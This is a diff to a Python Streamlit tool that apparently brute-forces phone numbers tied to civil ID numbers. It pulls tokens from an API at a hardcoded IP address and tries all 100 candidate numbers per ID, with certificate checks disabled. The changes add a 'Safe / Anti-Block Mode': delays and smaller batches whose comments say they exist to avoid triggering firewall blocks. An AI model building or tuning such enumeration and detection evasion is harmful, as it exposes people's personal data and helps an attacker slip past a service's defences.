@@ -14,7 +14,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Page configuration
 st.set_page_config(
-    page_title="📱 ROP Batch & Multi-Number Match Tool", page_icon="📱", layout="wide"
+    page_title="📱 ROP Batch & Multi-Number Match Tool (Safe Mode)", page_icon="📱", layout="wide"
 )
 
 # Initialize Session States
@@ -27,18 +27,12 @@ if "is_running" not in st.session_state:
 if "stop_requested" not in st.session_state:
     st.session_state.stop_requested = False
 
-st.title("📱 ROP Batch & Multi-Number Match Tool (Streamlit)")
+st.title("📱 ROP Batch Match Tool (Safe / Anti-Block Mode)")
 
 # Sidebar Configuration for Host & Headers
 st.sidebar.header("⚙️ Configuration")
 default_host = "5.37.58.147"
 host = st.sidebar.text_input("API Target Host / IP", value=default_host)
-
-burp_header = st.sidebar.text_area(
-    "Request Header (Optional)",
-    value=f"POST /nrsPhone HTTP/1.1\nHost: {host}\nContent-Type: application/json",
-    height=100,
-)
 
 # Main Section: Batch Data Input
 st.subheader("📋 Batch Search Input")
@@ -75,7 +69,7 @@ def fetch_fresh_token_for_civil_id(session, target_host, civil_id):
         payload = {"civilId": civil_id}
         headers = get_headers(target_host)
 
-        resp = session.post(url, json=payload, headers=headers, timeout=10)
+        resp = session.post(url, json=payload, headers=headers, timeout=15)
         resp_text = resp.text.strip()
         st.session_state.logs.append(f"📥 Civil ID Response for {civil_id}: {resp_text}")
 
@@ -120,7 +114,7 @@ def test_single_phone(
 col1, col2, col3, col4 = st.columns(4)
 
 with col1:
-    start_btn = st.button("🚀 START BATCH SEARCH", type="primary")
+    start_btn = st.button("🚀 START SAFE SEARCH", type="primary")
 with col2:
     stop_btn = st.button("⏹️ STOP", type="secondary")
 with col3:
@@ -170,14 +164,10 @@ if start_btn:
                     tasks_list.append((cid, last4))
 
         if not tasks_list:
-            st.error(
-                "Koi valid format nahi mila! Sahi format: CivilID, Last4Digits"
-            )
+            st.error("Koi valid format nahi mila! Sahi format: CivilID, Last4Digits")
             st.session_state.is_running = False
         else:
-            status_container.info(
-                f"🔄 Running Batch Search for {len(tasks_list)} items..."
-            )
+            status_container.info(f"🔄 Running Safe Search for {len(tasks_list)} items...")
             session = requests.Session()
             session.verify = False
 
@@ -188,6 +178,10 @@ if start_btn:
                 st.session_state.logs.append(
                     f"\n--- Processing [{idx+1}/{len(tasks_list)}] Civil ID: {civil_id} ---"
                 )
+                
+                # Small delay to prevent network blocking
+                time.sleep(1.0)
+                
                 success, data = fetch_fresh_token_for_civil_id(
                     session, host, civil_id
                 )
@@ -208,12 +202,17 @@ if start_btn:
                     prefix = clean_digits[:2]
 
                     phone_numbers = [f"{prefix}{i:02d}{suffix}" for i in range(100)]
-                    batch_size = 5
+                    
+                    # Safe slower batch size to avoid triggering firewall blocks
+                    batch_size = 2 
 
                     for i in range(0, len(phone_numbers), batch_size):
                         if st.session_state.stop_requested or matched_in_this_id:
                             break
                         batch = phone_numbers[i : i + batch_size]
+                        
+                        # Short delay between tiny batches
+                        time.sleep(0.3)
 
                         with concurrent.futures.ThreadPoolExecutor(
                             max_workers=batch_size
@@ -245,7 +244,7 @@ if start_btn:
             st.session_state.is_running = False
             st.rerun()
 
-# Display Results Section (Only Matched Results & Matched CSV Export)
+# Display Results Section
 st.markdown("---")
 st.subheader("🎯 Matched Results")
 if st.session_state.otp_results:
